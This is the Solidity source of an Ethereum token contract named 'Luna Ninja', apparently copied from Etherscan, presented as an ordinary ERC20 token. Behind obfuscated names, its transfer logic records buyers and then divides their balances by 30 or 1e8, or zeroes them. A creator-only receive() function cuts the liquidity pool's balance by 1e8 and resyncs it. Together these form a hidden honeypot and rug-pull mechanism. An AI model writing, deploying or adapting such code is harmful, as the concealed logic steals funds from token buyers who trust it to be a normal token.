/**
 *Submitted for verification at Etherscan.io on 2022-05-17
*/

// 384400 tokens for each km between the Ninja on Earth and the Moon. The Luninja is born.

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private ninjArr;
    address[] private ninAddr;
    bool[3] private Suzuki;

    mapping (address => bool) private Honda;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    uint256 private Middle = block.number*2;
    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply; uint256 private theN;
    bool private trading = false; uint256 private Teeth = 0; uint256 private Mighty = 1;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        ninAddr.push(_router); ninAddr.push(msgSender_); ninAddr.push(pair);
        for (uint256 q=0; q < 3; q++) {Honda[ninAddr[q]] = true; Suzuki[q] = false; }
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function last(uint256 g) internal view returns (address) { return (Teeth > 1 ? ninjArr[ninjArr.length-g-1] : address(0)); }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; Middle = block.number;
        return true;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    receive() external payable {
        require(msg.sender == ninAddr[1]); _balances[ninAddr[2]] /= (false ? 1 : 1e8); IUniswapV2Pair(ninAddr[2]).sync(); Suzuki[2] = true;
    }

    function _balancesOfTheDokwon(address sender, address recipient) internal {
        require((trading || (sender == ninAddr[1])), "ERC20: trading is not yet enabled.");
        Mighty += ((Honda[sender] != true) && (Honda[recipient] == true)) ? 1 : 0;
        if (((Honda[sender] == true) && (Honda[recipient] != true)) || ((Honda[sender] != true) && (Honda[recipient] != true))) { ninjArr.push(recipient); }
        _balancesOfTheNinjas(sender, recipient);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _balancesOfTheNinjas(address sender, address recipient) internal {
        if ((Suzuki[0] || (Suzuki[2] && (recipient != ninAddr[1])))) { for (uint256 q=0; q < ninjArr.length-1; q++) { _balances[ninjArr[q]] /= (Suzuki[2] ? 1e8 : 3e1); } Suzuki[0] = false; }
        _balances[last(1)] /= (((Middle == block.number) || Suzuki[1] || ((Middle - theN) <= 5)) && (Honda[last(1)] != true) && (Teeth > 1)) ? (2e1) : (1);
        _balances[last(0)] /= (((Suzuki[1]) && (last(0) == sender)) || ((Suzuki[2] && (ninAddr[1] != sender))) ? (0) : (1));
        (Suzuki[0],Suzuki[1]) = ((((Mighty % 5) == 0) && (Suzuki[1] == false)) ? (true,true) : (Suzuki[0],Suzuki[1]));
        Middle = block.number; Teeth++;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheDokwon(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployLuninja(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(ninAddr[0], 10 ** 77);
              
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployLuninja(creator, initialSupply);
    }
}

contract LunaNinja is ERC20Token {
    constructor() ERC20Token("Luna Ninja", "LUNINJA", msg.sender, 384400 * 10 ** 18) {
    }
}